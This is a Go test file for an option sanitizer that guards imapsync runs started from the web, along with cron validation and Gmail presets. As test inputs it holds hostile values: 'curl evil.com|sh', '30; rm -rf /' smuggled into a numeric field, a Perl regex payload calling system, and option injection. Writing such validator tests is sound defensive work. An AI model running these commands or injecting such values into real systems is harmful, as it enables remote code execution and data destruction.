package runner

import "testing"

func TestSanitizeOptions(t *testing.T) {
	cases := []struct {
		name         string
		in           map[string]any
		wantAccepted int
		wantRejected string
	}{
		{"safe flags", map[string]any{"automap": true, "usecache": true}, 2, ""},
		{"shell command", map[string]any{"pipemess": "curl evil.com|sh"}, 0, "pipemess"},
		{"perl eval", map[string]any{"regexmess": "s/a/b/"}, 0, "regexmess"},
		{"runner-managed", map[string]any{"host1": "evil.com"}, 0, "host1"},
		{"password dump", map[string]any{"debugimap": true}, 0, "debugimap"},
		{"option injection", map[string]any{"folder": "--pipemess"}, 0, "folder"},
		{"shell in int", map[string]any{"maxage": "30; rm -rf /"}, 0, "maxage"},
		{"regex code", map[string]any{"include": `(?{system("id")})`}, 0, "include"},
		{"numbers ok", map[string]any{"maxage": 30, "timeout": 120}, 2, ""},
		{"false flag dropped", map[string]any{"usecache": false}, 0, ""},
	}
	for _, c := range cases {
		accepted, rejected := SanitizeOptions(c.in)
		if len(accepted) != c.wantAccepted {
			t.Errorf("%s: accepted %v, want %d", c.name, accepted, c.wantAccepted)
		}
		if c.wantRejected == "" {
			if len(rejected) != 0 {
				t.Errorf("%s: unexpected rejects %v", c.name, rejected)
			}
		} else if len(rejected) != 1 || rejected[0] != c.wantRejected {
			t.Errorf("%s: rejected %v, want [%s]", c.name, rejected, c.wantRejected)
		}
	}
}

func TestValidateCron(t *testing.T) {
	if err := ValidateCron("0 3 * * *"); err != nil {
		t.Errorf("valid expression rejected: %v", err)
	}
	if err := ValidateCron("bad cron"); err == nil {
		t.Error("invalid expression accepted")
	}
}

func TestForkOptionsAreNotReachableFromTheWeb(t *testing.T) {
	// Each of these is a real defect, not a style preference: --parallel puts
	// both mailbox passwords into ps, --pipeline may append a different message
	// body than a plain run, --batchsize changes which fetches are issued, and
	// --condstore does nothing at all. A web request must not be able to ask for
	// any of them.
	safe, rejected := SanitizeOptions(map[string]any{
		"parallel": 4, "pipeline": 20, "batchsize": 500,
		"condstore": true, "nocondstore": true,
		"automap": true, // a legitimate one, to prove the map still works
	})
	for _, k := range []string{"parallel", "pipeline", "batchsize", "condstore", "nocondstore"} {
		if _, ok := safe[k]; ok {
			t.Errorf("%q reached imapsync's argv", k)
		}
		if !contains(rejected, k) {
			t.Errorf("%q was dropped without telling the caller", k)
		}
	}
	if safe["automap"] != true {
		t.Error("a legitimate option was dropped along with them")
	}
}

func contains(list []string, want string) bool {
	for _, v := range list {
		if v == want {
			return true
		}
	}
	return false
}

func TestFractionalRatesAreAccepted(t *testing.T) {
	// imapsync declares maxmessagespersecond as "=f". Requiring an integer
	// rejected 0.5, which is the value Gmail's rate limit actually wants.
	accepted, rejected := SanitizeOptions(map[string]any{
		"maxmessagespersecond": "0.5",
		"maxage":               "30.5",
		"timeout":              "12.5",
	})
	if len(rejected) > 0 {
		t.Errorf("a legal fractional value was rejected: %v", rejected)
	}
	if accepted["maxmessagespersecond"] != "0.5" {
		t.Errorf("value came through as %v", accepted["maxmessagespersecond"])
	}

	// A port is not a float, and neither is a byte count.
	_, rejected = SanitizeOptions(map[string]any{"port1": "993.5", "maxsize": "1.5"})
	if len(rejected) != 2 {
		t.Errorf("a fraction was accepted where only an integer makes sense: %v", rejected)
	}
}

func TestAnEmptyValueDoesNotEnableAFlag(t *testing.T) {
	// ParseOptionString yields an empty value for a trailing "--delete2" it
	// could not pair. truthy("") returned true, so that silently switched on
	// deletion at the destination — the one option in this list that destroys
	// mail.
	accepted, rejected := SanitizeOptions(map[string]any{"delete2": "", "expunge2": ""})
	if len(accepted) != 0 {
		t.Errorf("an empty value switched a flag on: %v", accepted)
	}
	if len(rejected) != 2 {
		t.Errorf("the caller was not told the values were unusable: %v", rejected)
	}

	// Asking for it properly still works.
	accepted, _ = SanitizeOptions(map[string]any{"delete2": true, "expunge2": "yes"})
	if accepted["delete2"] != true || accepted["expunge2"] != true {
		t.Errorf("an explicit request was dropped: %v", accepted)
	}
}

func TestApplyPresets(t *testing.T) {
	cases := []struct {
		name         string
		host1, host2 string
		in           map[string]any
		wantGmail1   bool
		wantUsecache bool
		wantNotes    int
	}{
		// Job 34: every Gmail label was copied as its own folder, so the
		// destination held three copies of most messages.
		{"gmail to other", "imap.gmail.com:993", "mail.example.com", map[string]any{"automap": true, "usecache": true}, true, false, 2},
		{"gmail without cache", "IMAP.Gmail.com", "mail.example.com", map[string]any{}, true, false, 1},
		{"gmail to gmail", "imap.gmail.com", "imap.gmail.com", map[string]any{"usecache": true}, false, true, 0},
		{"other to other", "mail.a.com", "mail.b.com", map[string]any{"usecache": true}, false, true, 0},
		{"lookalike host", "imap.gmail.com.evil.test", "mail.b.com", map[string]any{"usecache": true}, false, true, 0},
		{"already asked for", "imap.gmail.com", "mail.b.com", map[string]any{"gmail1": true}, true, false, 0},
		{"explicit crossduplicates", "mail.a.com", "mail.b.com", map[string]any{"skipcrossduplicates": true, "usecache": true}, false, false, 1},
	}
	for _, c := range cases {
		notes := ApplyPresets(c.host1, c.host2, c.in)
		if got := c.in["gmail1"] == true; got != c.wantGmail1 {
			t.Errorf("%s: gmail1 = %v, want %v", c.name, got, c.wantGmail1)
		}
		if got := c.in["usecache"] == true; got != c.wantUsecache {
			t.Errorf("%s: usecache = %v, want %v", c.name, got, c.wantUsecache)
		}
		if len(notes) != c.wantNotes {
			t.Errorf("%s: notes %v, want %d", c.name, notes, c.wantNotes)
		}
	}
}
